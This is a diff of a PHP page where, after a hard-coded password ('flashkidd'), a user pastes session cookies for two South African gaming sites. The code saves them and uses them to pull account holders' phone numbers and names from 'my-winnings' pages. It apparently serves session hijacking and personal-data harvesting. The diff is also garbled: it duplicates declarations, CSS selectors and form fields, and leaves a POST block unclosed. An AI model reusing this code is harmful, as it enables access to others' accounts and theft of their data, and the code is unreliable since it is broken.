@@ -3,11 +3,17 @@ session_start();
 
 $password = 'flashkidd';
 
+$message  = '';
+$success  = '';
+
+
+
 $message = '';
 $success = '';
 
 $message  = '';
 $success  = '';
+
 
 
 function fetchInfo($cookie, $url) {
@@ -60,6 +66,16 @@ function fetchInfo($cookie, $url) {
     return ['phone' => $phone, 'name' => $name];
 }
 
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $entered = $_POST['password'] ?? '';
+    $cookie  = trim($_POST['cookie'] ?? '');
+    $type    = $_POST['type'] ?? 'voda';
+    if ($entered === $password) {
+        $file = $type === 'mtn' ? 'cookies-mtn.json' : 'cookies.json';
+        $url  = $type === 'mtn'
+            ? 'https://yellorush.co.za/my-winnings?display=tab3'
+            : 'https://gameplay.mzansigames.club/my-winnings?display=tab3';
+
 
 if (isset($_POST['password']) && $_POST['password'] === $password) {
     $_SESSION['auth'] = true;
@@ -97,6 +113,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $file = 'cookies.json';
         $url  = 'https://gameplay.mzansigames.club/my-winnings?display=tab3';
 
+
         $list = json_decode(file_get_contents($file), true);
         foreach ($list as $entry) {
             if ($entry['value'] === $cookie) {
@@ -127,7 +144,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <style>
 body {
 
+
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+
 
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
         "Helvetica Neue", Arial, sans-serif;
@@ -159,7 +178,11 @@ label {
 
 input[type="password"], textarea, select {
 
+
+input[type="password"], textarea, select {
+
 input[type="password"], textarea {
+
 
     width: 100%;
     padding: 10px;
@@ -197,6 +220,7 @@ button {
 <body>
 <div class="container">
 
+
 <?php if (!isset($_SESSION['auth'])): ?>
     <h2>Enter Password</h2>
     <?php if ($message): ?><p class="message"><?php echo $message; ?></p><?php endif; ?>
@@ -208,10 +232,16 @@ button {
 <?php else: ?>
 
 
+
     <h2>Add Cookie</h2>
     <?php if ($message): ?><p class="message"><?php echo $message; ?></p><?php endif; ?>
     <?php if ($success): ?><p class="success"><?php echo $success; ?></p><?php endif; ?>
     <form method="post">
+
+        <label>Password:</label>
+        <input type="password" name="password" placeholder="Password" required>
+
+
 
         <label>Cookie:</label>
         <textarea name="cookie" placeholder="Paste cookie here" required></textarea>
@@ -222,6 +252,7 @@ button {
         </select>
         <button type="submit">Add</button>
     </form>
+
 <?php endif; ?>
 
         <label>Password:</label>
@@ -230,6 +261,7 @@ button {
         <textarea name="cookie" placeholder="Paste cookie here" required></textarea>
         <button type="submit">Add</button>
     </form>
+
 
 </div>
 </body>
